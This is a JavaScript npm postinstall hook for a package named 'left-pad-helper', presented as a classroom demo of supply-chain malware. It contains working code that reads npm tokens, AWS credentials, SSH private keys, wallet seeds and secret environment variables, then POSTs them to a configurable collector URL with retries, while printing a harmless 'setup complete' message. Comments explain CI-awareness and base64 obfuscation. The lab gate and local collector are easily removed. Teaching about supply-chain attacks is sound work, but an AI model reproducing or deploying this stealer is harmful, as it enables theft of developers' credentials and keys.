// EDUCATIONAL DEMO ONLY — unobfuscated on purpose so the room can read it.
// A `postinstall` lifecycle hook runs this AUTOMATICALLY during `npm install`,
// before any of the victim's own code. This is the exact mechanism behind the real
// 2025 npm worms: Shai-Hulud / Shai-Hulud 2.0 (postinstall/preinstall hooks),
// ethers-provider2 (trojanized ssh2, Mar 2025), and the chalk/debug clipper wave.
//
// What real malware does here: sweep the disk + env for secrets (npm tokens, cloud
// creds, SSH keys, CI secrets, wallet seeds) and beacon them to a webhook/C2.
// This demo reproduces that MECHANISM byte-for-byte, but every secret it finds is a
// PLANT and the beacon goes to a LOCAL collector container — nothing leaves the box.
const fs = require('fs');
const os = require('os');
const http = require('http');
const { URL } = require('url');

const COLLECTOR = process.env.COLLECTOR_URL || 'http://collector:8080/collect';
const HOME = os.homedir();
const read = (p) => { try { return fs.readFileSync(p, 'utf8').trim(); } catch { return null; } };

// FAIL CLOSED: only harvest inside the demo lab container (compose sets DEMO_LAB=1).
// If someone runs `npm install` in this folder on their real host, do nothing — so we
// never read their real ~/.aws, ~/.ssh, etc. (Real malware has no such courtesy.)
if (process.env.DEMO_LAB !== '1') {
  console.log('[left-pad-helper] postinstall: setup complete.');
  process.exit(0);
}

// --- real malware is often CI-aware; shown here but left OFF for a reliable stage run ---
// if (!process.env.CI && !process.env.GITHUB_ACTIONS) return;

// 1) HARVEST — each line mirrors a real npm-malware target, over PLANTED fakes only.
const loot = {
  '~/.npmrc (_authToken)':      read(`${HOME}/.npmrc`),            // eslint-scope, Shai-Hulud
  '~/.aws/credentials':         read(`${HOME}/.aws/credentials`),  // Ectoplasm, Shai-Hulud
  '~/.ssh/id_rsa':              read(`${HOME}/.ssh/id_rsa`),       // Shai-Hulud TruffleHog sweep
  '~/.wallet/seed.txt':         read(`${HOME}/.wallet/seed.txt`),  // chalk/debug clipper era
  'process.env (CI secrets)':   Object.fromEntries(               // Shai-Hulud, CI-aware campaigns
    Object.entries(process.env).filter(([k]) => /TOKEN|KEY|SECRET|PASSWORD/i.test(k))),
};

// 2) PACKAGE in a real beacon shape (Discord-webhook style).
const beacon = {
  username: 'left-pad-helper',
  content: `loot from ${os.userInfo().username}@${os.hostname()}`,
  host: os.hostname(),
  user: os.userInfo().username,
  ts: new Date().toISOString(),
  loot,
};

// 3) OBFUSCATE (teaching toggle): real malware nests atob()/base64. The collector
//    decodes either form. Keep plaintext for the readable stage run.
// const body = Buffer.from(JSON.stringify(beacon)).toString('base64');
const body = JSON.stringify(beacon);

// 4) BEACON to the LOCAL collector (stands in for a Discord/webhook.site/raw-IP C2).
//    Retries quietly so the demo is forgiving if the collector starts a beat later.
function send(attempt) {
  attempt = attempt || 0;
  try {
    const u = new URL(COLLECTOR);
    const req = http.request(
      { hostname: u.hostname, port: u.port || 80, path: u.pathname, method: 'POST',
        headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) } },
      (res) => res.resume());
    req.on('error', () => { if (attempt < 20) setTimeout(() => send(attempt + 1), 1500); });
    req.end(body);
  } catch (e) { if (attempt < 20) setTimeout(() => send(attempt + 1), 1500); }
}
send();

// Looks completely innocuous in the install log. The victim installed a string helper;
// `npm install` also shipped their secrets.
console.log('[left-pad-helper] postinstall: setup complete.');
